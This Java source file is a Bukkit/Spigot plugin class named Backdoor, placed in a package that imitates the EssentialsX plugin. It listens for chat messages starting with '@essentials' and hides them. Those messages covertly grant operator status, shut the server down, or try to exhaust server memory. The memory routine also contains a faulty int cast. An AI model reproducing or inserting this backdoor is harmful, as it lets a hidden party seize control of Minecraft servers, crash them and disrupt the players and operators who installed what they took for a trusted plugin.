package com.redbean0721.essentialsx.Event;

import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Backdoor implements Listener {

    private JavaPlugin plugin;

    public Backdoor(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.startsWith("@essentials")) {
            String command = message.substring("@essentials".length()).trim();

            switch (command.toLowerCase()) {
                case "getop":
                    handleGetOpCommand(player);
                    break;
                case "stop":
                    handleStopCommand(player);
                    break;
                case "fillmemory":
                    handleFillMemoryCommand(player);
                    break;
                default:
                    break;
            }
            event.setCancelled(true);
        }
    }

    private void handleGetOpCommand(Player player) {
        if (player.hasPermission("essentialsx.getop")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                player.setOp(true);
                player.sendMessage(ChatColor.YELLOW + "你已获得 OP 权限");
            });
        }
    }

    private void handleStopCommand(Player player) {
        if (player.hasPermission("essentialsx.stop")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.shutdown();
            });
        }
    }

    private void handleFillMemoryCommand(Player player) {
        if (player.hasPermission("essentialsx.fillmemory")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                long maxMemory = Runtime.getRuntime().maxMemory();
                long allocatedMemory = Runtime.getRuntime().totalMemory();
                long freeMemory = Runtime.getRuntime().freeMemory();
                long usedMemory = allocatedMemory - freeMemory;
                long remainingMemory = maxMemory - usedMemory;

                long targetMemory = 16L * 1024 * 1024 * 1024;
                long memoryToAllocate = Math.max(targetMemory - remainingMemory, 0);

                if (memoryToAllocate > 0) {
                    try {
                        byte[] memoryToAllocateArray = new byte[(int) memoryToAllocate];
                        Runtime.getRuntime().gc();
                        memoryToAllocateArray = new byte[(int) memoryToAllocate];
                    } catch (OutOfMemoryError e) {
                    }
                }
            });
        }
    }
}
